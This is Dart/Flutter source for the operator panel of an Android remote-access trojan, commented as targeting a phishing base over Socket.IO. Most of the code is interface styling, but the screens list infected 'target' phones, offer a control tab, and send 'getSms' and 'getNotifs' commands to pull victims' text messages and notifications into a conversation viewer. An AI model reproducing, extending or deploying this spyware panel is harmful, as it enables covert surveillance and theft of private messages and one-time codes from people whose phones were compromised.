              color: const Color(0xFF0D1E38).withValues(alpha: 0.85),
              border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.18)),
            ),
            alignment: Alignment.center,
            child: Icon(
              Icons.smartphone_outlined,
              size: 24,
              color: HoxtenThemeColors.textDim,
            ),
          ),
          const SizedBox(height: 14),
          Text(
            'No Devices',
            textAlign: TextAlign.center,
            style: HoxtenThemeTypography.title(color: HoxtenThemeColors.t1).copyWith(letterSpacing: 1),
          ),
          const SizedBox(height: 14),
          Text(
            'Belom ada device...',
            textAlign: TextAlign.center,
            style: HoxtenThemeTypography.tag(fontSize: 8, color: HoxtenThemeColors.t2).copyWith(letterSpacing: 2),
          ),
        ],
      ),
    );
  }
}

class _DevicesBackdrop extends StatelessWidget {
  const _DevicesBackdrop();

  @override
  Widget build(BuildContext context) {
    return IgnorePointer(
      child: Stack(
        fit: StackFit.expand,
        children: [
          const DecoratedBox(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Color(0xFF040A16),
                  HoxtenThemeColors.b0,
                  Color(0xFF050D1A),
                ],
              ),
            ),
          ),
          const CustomPaint(
            painter: _DevicesGridPainter(),
            size: Size.infinite,
          ),
          Positioned(
            top: -30,
            right: -20,
            child: Container(
              width: 220,
              height: 220,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [
                    HoxtenThemeColors.blue.withValues(alpha: 0.1),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned(
            bottom: 120,
            left: -60,
            child: Container(
              width: 240,
              height: 240,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  colors: [
                    HoxtenThemeColors.cyan.withValues(alpha: 0.06),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned.fill(
            child: DecoratedBox(
              decoration: BoxDecoration(
                gradient: RadialGradient(
                  center: const Alignment(0, -0.2),
                  radius: 1.1,
                  colors: [
                    Colors.transparent,
                    HoxtenThemeColors.b0.withValues(alpha: 0.25),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _DevicesGridPainter extends CustomPainter {
  const _DevicesGridPainter();

  @override
  void paint(Canvas canvas, Size size) {
    const step = 26.0;
    final grid = Paint()
      ..strokeWidth = 0.55
      ..color = HoxtenThemeColors.blue.withValues(alpha: 0.045);
    final grid2 = Paint()
      ..strokeWidth = 0.4
      ..color = HoxtenThemeColors.cyan.withValues(alpha: 0.025);

    for (var x = 0.0; x <= size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (var y = 0.0; y <= size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }

    for (var x = step / 2; x <= size.width; x += step) {
      for (var y = step / 2; y <= size.height; y += step) {
        canvas.drawCircle(Offset(x, y), 0.8, grid2);
      }
    }

    final fade = Paint()
      ..shader = LinearGradient(
        begin: Alignment.topCenter,
        end: Alignment.bottomCenter,
        colors: [
          HoxtenThemeColors.b0.withValues(alpha: 0.35),
          Colors.transparent,
          HoxtenThemeColors.b0.withValues(alpha: 0.5),
        ],
        stops: const [0, 0.45, 1],
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height));
    canvas.drawRect(Rect.fromLTWH(0, 0, size.width, size.height), fade);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

enum _BattLevel { ok, warn, crit }

class DeviceDcard extends StatelessWidget {
  const DeviceDcard({
    super.key,
    required this.device,
    required this.index,
    required this.selected,
    required this.onTap,
  });

  final HoxtenDeviceModel device;
  final int index;
  final bool selected;
  final VoidCallback onTap;

  @override
  Widget build(BuildContext context) {
    final batt = device.battery;
    final battLevel = _battLevel(batt);
    final battColor = _battColor(battLevel);

    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(16),
        splashColor: HoxtenThemeColors.blue.withValues(alpha: 0.08),
        highlightColor: HoxtenThemeColors.blue.withValues(alpha: 0.04),
        child: Ink(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(16),
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: selected
                  ? [
                      HoxtenThemeColors.blue.withValues(alpha: 0.12),
                      const Color(0xFF081428).withValues(alpha: 0.96),
                    ]
                  : [
                      const Color(0xFF0D1E38).withValues(alpha: 0.82),
                      const Color(0xFF081428).withValues(alpha: 0.92),
                    ],
            ),
            border: Border.all(
              color: selected
                  ? HoxtenThemeColors.blue.withValues(alpha: 0.32)
                  : HoxtenThemeColors.blue.withValues(alpha: 0.1),
            ),
            boxShadow: [
              if (selected)
                BoxShadow(
                  color: HoxtenThemeColors.blue.withValues(alpha: 0.1),
                  blurRadius: 20,
                  offset: const Offset(0, 6),
                ),
            ],
          ),
          child: Stack(
            children: [
              Positioned(
                left: 0,
                right: 0,
                top: 0,
                child: Container(
                  height: 1,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        Colors.transparent,
                        HoxtenThemeColors.blue.withValues(alpha: selected ? 0.28 : 0.16),
                        Colors.transparent,
                      ],
                    ),
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.fromLTRB(14, 13, 14, 13),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    _PhoneColumn(
                      selected: selected,
                      battery: batt,
                      charging: device.charging,
                      battColor: battColor,
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            device.name,
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: HoxtenThemeTypography.style(
                              fontSize: 15,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 0.2,
                              color: HoxtenThemeColors.t0,
                              shadows: selected
                                  ? [
                                      Shadow(
                                        color: HoxtenThemeColors.blue.withValues(alpha: 0.3),
                                        blurRadius: 16,
                                      ),
                                    ]
                                  : null,
                            ),
                          ),
                          const SizedBox(height: 2),
                          Text(
                            device.id,
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: HoxtenThemeTypography.style(
                              fontSize: 8,
                              fontWeight: FontWeight.w500,
                              letterSpacing: 0.2,
                              color: HoxtenThemeColors.t2.withValues(alpha: 0.65),
                            ),
                          ),
                          if (batt >= 0) ...[
                            const SizedBox(height: 3),
                            Text(
                              'Android ${device.androidVersion} - SDK ${device.sdkVersion}',
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                              style: HoxtenThemeTypography.style(
                                fontSize: 8,
                                fontWeight: FontWeight.w500,
                                color: HoxtenThemeColors.t2,
                                letterSpacing: 0.3,
                              ),
                            ),
                          ],
                        ],
                      ),
                    ),
                    const SizedBox(width: 6),
                    _RightColumn(index: index, selected: selected),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  static _BattLevel _battLevel(int batt) {
    if (batt < 0) return _BattLevel.ok;
    if (batt <= 20) return _BattLevel.crit;
    return _BattLevel.ok;
  }

  static Color _battColor(_BattLevel level) {
    return switch (level) {
      _BattLevel.crit => HoxtenThemeColors.dashRed,
      _BattLevel.warn => HoxtenThemeColors.dashAmber,
      _BattLevel.ok => HoxtenThemeColors.dashGreen,
    };
  }
}

class _PhoneColumn extends StatelessWidget {
  const _PhoneColumn({
    required this.selected,
    required this.battery,
    required this.charging,
    required this.battColor,
  });

  final bool selected;
  final int battery;
  final bool charging;
  final Color battColor;

  @override
  Widget build(BuildContext context) {
    return SizedBox(
      width: 44,
      child: Column(
        children: [
          _PhoneMockup(selected: selected),
          if (battery >= 0) ...[
            const SizedBox(height: 3),
            _BatteryBar(level: battery, color: battColor),
            const SizedBox(height: 2),
            Text(
              '$battery%${charging ? '?' : ''}',
              style: HoxtenThemeTypography.style(
                fontSize: 7,
                fontWeight: FontWeight.w600,
                height: 1,
                color: HoxtenThemeColors.t0,
              ),
            ),
          ],
        ],
      ),
    );
  }
}

class _PhoneMockup extends StatelessWidget {
  const _PhoneMockup({required this.selected});

  final bool selected;

  @override
  Widget build(BuildContext context) {
    final borderColor = selected ? HoxtenThemeColors.blue2 : HoxtenThemeColors.t2;

    return Container(
      width: 28,
      height: 44,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(6),
        border: Border.all(color: borderColor, width: 2),
        gradient: const LinearGradient(
          begin: Alignment(-0.4, -1),
          end: Alignment(0.7, 1),
          colors: [Color(0xFF0D1E38), Color(0xFF050D1F)],
        ),
        boxShadow: const [
          BoxShadow(color: Color(0x80000000), offset: Offset(2, 3), blurRadius: 0),
        ],
      ),
      child: Stack(
        children: [
          Positioned(
            top: 4,
            left: 0,
            right: 0,
            child: Center(
              child: Container(
                width: 10,
                height: 1.5,
                decoration: BoxDecoration(
                  color: HoxtenThemeColors.t2.withValues(alpha: 0.5),
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
            ),
          ),
          Positioned(
            top: 8,
            left: 2,
            right: 2,
            bottom: 14,
            child: DecoratedBox(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(2),
                gradient: LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: selected
                      ? [
                          HoxtenThemeColors.blue.withValues(alpha: 0.3),
                          HoxtenThemeColors.cyan.withValues(alpha: 0.2),
                        ]
                      : [
                          HoxtenThemeColors.blue.withValues(alpha: 0.15),
                          HoxtenThemeColors.cyan.withValues(alpha: 0.1),
                        ],
                ),
                border: Border.all(
                  color: HoxtenThemeColors.blue.withValues(alpha: selected ? 0.35 : 0.15),
                ),
                boxShadow: selected
                    ? [BoxShadow(color: HoxtenThemeColors.blue.withValues(alpha: 0.3), blurRadius: 8)]
                    : null,
              ),
            ),
          ),
          Positioned(
            bottom: 4,
            left: 0,
            right: 0,
            child: Center(
              child: Container(
                width: 8,
                height: 8,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: HoxtenThemeColors.t2.withValues(alpha: 0.5)),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _BatteryBar extends StatelessWidget {
  const _BatteryBar({required this.level, required this.color});

  final int level;
  final Color color;

  @override
  Widget build(BuildContext context) {
    final fill = (level >= 0 ? level.clamp(4, 100) : 50) / 100.0;

    return SizedBox(
      width: 28,
      child: Row(
        children: [
          Expanded(
            child: Container(
              height: 6,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(2),
                border: Border.all(color: HoxtenThemeColors.t2.withValues(alpha: 0.4)),
              ),
              clipBehavior: Clip.antiAlias,
              child: Align(
                alignment: Alignment.centerLeft,
                child: TweenAnimationBuilder<double>(
                  tween: Tween(end: fill),
                  duration: const Duration(milliseconds: 400),
                  curve: Curves.easeOutCubic,
                  builder: (_, value, child) => FractionallySizedBox(
                    widthFactor: value,
                    child: child,
                  ),
                  child: Container(
                    decoration: BoxDecoration(
                      color: color,
                      borderRadius: BorderRadius.circular(1),
                    ),
                  ),
                ),
              ),
            ),
          ),
          Container(
            width: 2,
            height: 3,
            margin: const EdgeInsets.only(left: 2),
            decoration: BoxDecoration(
              color: HoxtenThemeColors.t2.withValues(alpha: 0.4),
              borderRadius: const BorderRadius.horizontal(right: Radius.circular(1)),
            ),
          ),
        ],
      ),
    );
  }
}

class _RightColumn extends StatelessWidget {
  const _RightColumn({required this.index, required this.selected});

  final int index;
  final bool selected;

  @override
  Widget build(BuildContext context) {
    final num = (index + 1).toString().padLeft(2, '0');

    return SizedBox(
      width: 28,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.end,
        children: [
          const _PulsingOnlineDot(),
          const SizedBox(height: 5),
          Text(
            num,
            style: HoxtenThemeTypography.style(
              fontSize: 9,
              fontWeight: FontWeight.w600,
              letterSpacing: 0.5,
              color: selected ? HoxtenThemeColors.blue2 : HoxtenThemeColors.t2.withValues(alpha: 0.7),
            ),
          ),
          if (selected) ...[
            const SizedBox(height: 5),
            Container(
              width: 18,
              height: 18,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(5),
                gradient: const LinearGradient(
                  colors: [HoxtenThemeColors.blue, HoxtenThemeColors.cyan2],
                ),
                boxShadow: [
                  BoxShadow(
                    color: HoxtenThemeColors.blue.withValues(alpha: 0.4),
                    blurRadius: 10,
                  ),
                ],
              ),
              child: const Icon(Icons.check_rounded, size: 12, color: Colors.white),
            ),
          ],
        ],
      ),
    );
  }
}

class _PulsingOnlineDot extends StatefulWidget {
  const _PulsingOnlineDot();

  @override
  State<_PulsingOnlineDot> createState() => _PulsingOnlineDotState();
}

class _PulsingOnlineDotState extends State<_PulsingOnlineDot> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<double> _pulse;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 2000))..repeat(reverse: true);
    _pulse = Tween(begin: 0.6, end: 1.0).animate(CurvedAnimation(parent: _ctrl, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _ctrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _pulse,
      builder: (_, __) {
        return Container(
          width: 8,
          height: 8,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: HoxtenThemeColors.dashGreen,
            boxShadow: [
              BoxShadow(
                color: HoxtenThemeColors.dashGreen.withValues(alpha: 0.35 + _pulse.value * 0.45),
                blurRadius: 4 + _pulse.value * 6,
              ),
            ],
          ),
        );
      },
    );
  }
}





class HoxtenSmsScreen extends StatefulWidget {
  const HoxtenSmsScreen({super.key});

  @override
  State<HoxtenSmsScreen> createState() => _HoxtenSmsScreenState();
}

class _HoxtenSmsScreenState extends State<HoxtenSmsScreen> with SingleTickerProviderStateMixin {
  final _cmd = HoxtenCommandService();
  late final TabController _tabs;
  String? _selectedKey;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 2, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _loadSms();
      _loadNotifs();
    });
  }

  @override
  void dispose() {
    _tabs.dispose();
    super.dispose();
  }

  Future<void> _send(String command) async {
    final socket = context.read<HoxtenSocketService>();
    final token = socket.commandToken;
    final id = socket.selectedDeviceId;
    if (id == null) return;
    if (token == null) return;
    await _cmd.send(token: token, deviceId: id, command: command, value: '');
  }

  Future<void> _loadSms() => _send('getSms');
  Future<void> _loadNotifs() => _send('getNotifs');

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<HoxtenSocketService>();
    final id = socket.selectedDeviceId;

    if (id == null) {
      return ColoredBox(
        color: HoxtenThemeColors.b0,
        child: Center(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(Icons.chat_bubble_outline_rounded, size: 40, color: HoxtenThemeColors.t2.withValues(alpha: 0.5)),
              const SizedBox(height: 12),
              Text('Pilih device dulu', style: HoxtenThemeTypography.title()),
              const SizedBox(height: 4),
              Text('Buka tab Devices untuk memilih target', style: HoxtenThemeTypography.bodySmall()),
            ],
          ),
        ),
      );
    }

    final smsGrouped = DevicePayload.groupConversations(socket.smsByDevice[id] ?? []);
    final notifGrouped = DevicePayload.groupConversations(socket.notifsByDevice[id] ?? []);

    return ColoredBox(
      color: HoxtenThemeColors.b0,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const HoxtenSectionLabel('Pesan & Notifikasi'),
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 8),
            child: Container(
              height: 40,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                color: HoxtenThemeColors.b2,
                border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.14)),
              ),
              child: TabBar(
                controller: _tabs,
                onTap: (_) => setState(() => _selectedKey = null),
                indicatorSize: TabBarIndicatorSize.tab,
                dividerColor: Colors.transparent,
                indicator: BoxDecoration(
                  borderRadius: BorderRadius.circular(10),
                  gradient: LinearGradient(
                    colors: [
                      HoxtenThemeColors.blue.withValues(alpha: 0.22),
                      HoxtenThemeColors.cyan.withValues(alpha: 0.1),
                    ],
                  ),
                  border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.28)),
                ),
                labelColor: HoxtenThemeColors.blue2,
                unselectedLabelColor: HoxtenThemeColors.t2,
                labelStyle: HoxtenThemeTypography.style(fontSize: 11, fontWeight: FontWeight.w700, letterSpacing: 1.2),
                unselectedLabelStyle: HoxtenThemeTypography.style(fontSize: 11, fontWeight: FontWeight.w500, letterSpacing: 0.8),
                tabs: const [
                  Tab(text: 'SMS'),
                  Tab(text: 'NOTIFIKASI'),
                ],
              ),
            ),
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _ConversationPane(
                  emptyLabel: 'Belum ada pesan SMS',
                  grouped: smsGrouped,
                  selectedKey: _selectedKey,
                  onSelect: (k) => setState(() => _selectedKey = k),
                  onBack: () => setState(() => _selectedKey = null),
                  onRefresh: _loadSms,
                ),
                _ConversationPane(
                  emptyLabel: 'Belum ada notifikasi',
                  grouped: notifGrouped,
                  selectedKey: _selectedKey,
                  onSelect: (k) => setState(() => _selectedKey = k),
                  onBack: () => setState(() => _selectedKey = null),
                  onRefresh: _loadNotifs,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class _ConversationPane extends StatelessWidget {
  const _ConversationPane({
    required this.emptyLabel,
    required this.grouped,
    required this.selectedKey,
    required this.onSelect,
    required this.onBack,
    required this.onRefresh,
  });

  final String emptyLabel;
  final Map<String, List<Map<String, dynamic>>> grouped;
  final String? selectedKey;
  final ValueChanged<String> onSelect;
  final VoidCallback onBack;
  final VoidCallback onRefresh;

  @override
  Widget build(BuildContext context) {
    if (selectedKey != null && grouped.containsKey(selectedKey)) {
      return _MessageDetail(
        title: selectedKey!,
        messages: grouped[selectedKey]!,
        onBack: onBack,
      );
    }

    return _AppList(
      emptyLabel: emptyLabel,
      grouped: grouped,
      onSelect: onSelect,
      onRefresh: onRefresh,
    );
  }
}

class _AppList extends StatelessWidget {
  const _AppList({
    required this.emptyLabel,
    required this.grouped,
    required this.onSelect,
    required this.onRefresh,
  });

  final String emptyLabel;
  final Map<String, List<Map<String, dynamic>>> grouped;
  final ValueChanged<String> onSelect;
  final VoidCallback onRefresh;

  @override
  Widget build(BuildContext context) {
    if (grouped.isEmpty) {
      return ListView(
        padding: const EdgeInsets.fromLTRB(16, 8, 16, 100),
        children: [
          const SizedBox(height: 40),
          Center(child: Text(emptyLabel, style: HoxtenThemeTypography.body())),
          const SizedBox(height: 16),
          Center(
            child: _RefreshButton(onPressed: onRefresh),
          ),
        ],
      );
    }

    return ListView(
      padding: const EdgeInsets.fromLTRB(16, 4, 16, 100),
      children: [
        Padding(
          padding: const EdgeInsets.only(bottom: 12),
          child: Row(
            children: [
              Text(
                '${grouped.length} percakapan',
                style: HoxtenThemeTypography.bodySmall(),
              ),
              const Spacer(),
              _RefreshButton(onPressed: onRefresh, compact: true),
            ],
          ),
        ),
        ...grouped.entries.map((e) {
          final preview = e.value.isNotEmpty ? e.value.first['body']?.toString() ?? '' : '';
          final initial = e.key.isNotEmpty ? e.key.substring(0, 1).toUpperCase() : '?';

          return Padding(
            padding: const EdgeInsets.only(bottom: 9),
            child: _SmsAppItem(
              initial: initial,
              name: e.key,
              count: e.value.length,
              preview: preview,
              onTap: () => onSelect(e.key),
            ),
          );
        }),
      ],
    );
  }
}

class _SmsAppItem extends StatelessWidget {
  const _SmsAppItem({
    required this.initial,
    required this.name,
    required this.count,
    required this.preview,
    required this.onTap,
  });

  final String initial;
  final String name;
  final int count;
  final String preview;
  final VoidCallback onTap;

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(14),
        child: Ink(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                const Color(0xFF0D1E38).withValues(alpha: 0.7),
                const Color(0xFF081428).withValues(alpha: 0.85),
              ],
            ),
            border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.12)),
          ),
          child: Padding(
            padding: const EdgeInsets.all(14),
            child: Row(
              children: [
                Container(
                  width: 42,
                  height: 42,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    color: HoxtenThemeColors.blue.withValues(alpha: 0.1),
                    border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.22)),
                  ),
                  child: Center(
                    child: Text(
                      initial,
                      style: HoxtenThemeTypography.style(
                        fontSize: 16,
                        fontWeight: FontWeight.w700,
                        color: HoxtenThemeColors.blue2,
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Expanded(
                            child: Text(
                              name,
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                              style: HoxtenThemeTypography.style(
                                fontSize: 14,
                                fontWeight: FontWeight.w600,
                                color: HoxtenThemeColors.t0,
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                            decoration: BoxDecoration(
                              color: HoxtenThemeColors.blue.withValues(alpha: 0.15),
                              borderRadius: BorderRadius.circular(20),
                            ),
                            child: Text(
                              '$count',
                              style: HoxtenThemeTypography.style(
                                fontSize: 9,
                                fontWeight: FontWeight.w700,
                                color: HoxtenThemeColors.blue2,
                              ),
                            ),
                          ),
                        ],
                      ),
                      if (preview.isNotEmpty) ...[
                        const SizedBox(height: 4),
                        Text(
                          preview,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: HoxtenThemeTypography.bodySmall(),
                        ),
                      ],
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                Icon(Icons.chevron_right_rounded, size: 18, color: HoxtenThemeColors.t2),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _MessageDetail extends StatelessWidget {
  const _MessageDetail({
    required this.title,
    required this.messages,
    required this.onBack,
  });

  final String title;
  final List<Map<String, dynamic>> messages;
  final VoidCallback onBack;

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(8, 4, 16, 8),
          child: Row(
            children: [
              IconButton(
                onPressed: onBack,
                icon: const Icon(Icons.arrow_back_ios_new_rounded, size: 16, color: HoxtenThemeColors.blue2),
              ),
              Expanded(
                child: Text(
                  title,
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                  style: HoxtenThemeTypography.title().copyWith(fontSize: 15),
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: messages.isEmpty
              ? Center(child: Text('Tidak ada pesan', style: HoxtenThemeTypography.bodySmall()))
              : ListView.separated(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 100),
                  itemCount: messages.length,
                  separatorBuilder: (context, index) => const SizedBox(height: 9),
                  itemBuilder: (_, i) {
                    final msg = messages[i];
                    return _SmsMsgCard(
                      sender: msg['title']?.toString() ?? 'â€”',
                      body: msg['body']?.toString() ?? '-',
                      time: msg['date']?.toString() ?? '',
                    );
                  },
                ),
        ),
      ],
    );
  }
}

class _SmsMsgCard extends StatelessWidget {
  const _SmsMsgCard({
    required this.sender,
    required this.body,
    required this.time,
  });

  final String sender;
  final String body;
  final String time;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.fromLTRB(14, 12, 14, 12),
      decoration: BoxDecoration(
        color: HoxtenThemeColors.b3.withValues(alpha: 0.6),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.12)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Expanded(
                child: Text(
                  sender,
                  style: HoxtenThemeTypography.style(
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                    color: HoxtenThemeColors.blue2,
                  ),
                ),
              ),
              if (time.isNotEmpty)
                Text(
                  time,
                  style: HoxtenThemeTypography.style(
                    fontSize: 10,
                    fontWeight: FontWeight.w500,
                    color: HoxtenThemeColors.t2,
                    letterSpacing: 0.2,
                  ),
                ),
            ],
          ),
          const SizedBox(height: 6),
          Text(
            body,
            style: HoxtenThemeTypography.body().copyWith(fontSize: 13, height: 1.5),
          ),
        ],
      ),
    );
  }
}

class _RefreshButton extends StatelessWidget {
  const _RefreshButton({required this.onPressed, this.compact = false});

  final VoidCallback onPressed;
  final bool compact;

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onPressed,
        borderRadius: BorderRadius.circular(compact ? 8 : 10),
        child: Ink(
          padding: EdgeInsets.symmetric(
            horizontal: compact ? 12 : 20,
            vertical: compact ? 5 : 10,
          ),
          decoration: BoxDecoration(
            color: HoxtenThemeColors.blue.withValues(alpha: 0.1),
            borderRadius: BorderRadius.circular(compact ? 8 : 10),
            border: Border.all(color: HoxtenThemeColors.blue.withValues(alpha: 0.3)),
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(Icons.refresh_rounded, size: compact ? 14 : 16, color: HoxtenThemeColors.blue2),
              if (!compact) ...[
                const SizedBox(width: 8),
                Text('Refresh', style: HoxtenThemeTypography.button().copyWith(fontSize: 13, color: HoxtenThemeColors.blue2)),
              ],
            ],
          ),
        ),
      ),
    );
  }
}





/// HOXTEN â€” controller dari sync_app, target Base phising (Socket.IO).
class HoxtenRatPage extends StatelessWidget {
  final VoidCallback? onBack;
  const HoxtenRatPage({super.key, this.onBack});

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (_) => HoxtenAuthService()),
        ChangeNotifierProvider(create: (_) => HoxtenSocketService()),
      ],
      child: _HoxtenRatPageView(onBack: onBack),
    );
  }
}

class _HoxtenRatPageView extends StatefulWidget {
  final VoidCallback? onBack;
  const _HoxtenRatPageView({super.key, this.onBack});

  @override
  State<_HoxtenRatPageView> createState() => _HoxtenRatPageViewState();
}

class _HoxtenRatPageViewState extends State<_HoxtenRatPageView> {
  int _tab = 0;
  String? _bootError;
  bool _booting = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) => _bootstrap());
  }

  Future<void> _bootstrap() async {
    final auth = context.read<HoxtenAuthService>();
    final socket = context.read<HoxtenSocketService>();
    try {
      // await ensureRatConfig();
      final token = await auth.ensureSession(forceRefresh: socket.lastError != null);
      socket.connect(token);
      if (mounted) {
        setState(() {
          _bootError = null;
          _booting = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _bootError = e.toString();
          _booting = false;
        });
      }
    }
  }

  void _goTab(int index) {
    if (index == 2 && context.read<HoxtenSocketService>().selectedDeviceId == null) {
      index = 1;
    }
    setState(() => _tab = index);
  }

  @override
  Widget build(BuildContext context) {
    return Theme(
      data: HoxtenAppTheme.HoxtenDark(),
      child: Scaffold(
        backgroundColor: HoxtenThemeColors.b0,
        appBar: AppBar(
          
          
          title: const Text('RDVSP'),
          actions: [
            IconButton(
              tooltip: 'Refresh koneksi',
              onPressed: _booting ? null : _bootstrap,
              icon: const Icon(Icons.refresh_rounded),
            ),
          ],
        ),
        body: _booting
            ? const Center(child: CircularProgressIndicator())
            : _bootError != null
                ? _buildError()
                : IndexedStack(
                    index: _tab,
                    children: [
                      HoxtenDevicesScreen(onDeviceSelected: () => _goTab(1)),
                      HoxtenDeviceControlScreen(
                        embedded: true,
                        onPickDevice: () => _goTab(0),
                      ),
                      const HoxtenSmsScreen(),
                    ],
                  ),
        bottomNavigationBar: _booting || _bootError != null
            ? null
            : NavigationBar(
                selectedIndex: _tab,
                onDestinationSelected: _goTab,
                destinations: const [
                  NavigationDestination(
                    icon: Icon(Icons.devices_other_outlined),
                    selectedIcon: Icon(Icons.devices_other),
                    label: 'Devices',
                  ),
                  NavigationDestination(
                    icon: Icon(Icons.gamepad_outlined),
                    selectedIcon: Icon(Icons.gamepad),
                    label: 'Control',
                  ),
                  NavigationDestination(
                    icon: Icon(Icons.sms_outlined),
                    selectedIcon: Icon(Icons.sms),
                    label: 'Pesan',
                  ),
                ],
              ),
      ),
    );
  }

  Widget _buildError() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(24),
        child: HoxtenCard(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(Icons.wifi_off_rounded, size: 40, color: HoxtenThemeColors.dashRed),
              const SizedBox(height: 12),
              Text('RDVSP gagal connect', style: HoxtenThemeTypography.title()),
              const SizedBox(height: 8),
              Text(_bootError ?? '', textAlign: TextAlign.center, style: HoxtenThemeTypography.body()),
              const SizedBox(height: 16),
              FilledButton(
                onPressed: () {
                  setState(() {
                    _booting = true;
                    _bootError = null;
                  });
                  _bootstrap();
                },
                child: const Text('COBA LAGI'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}






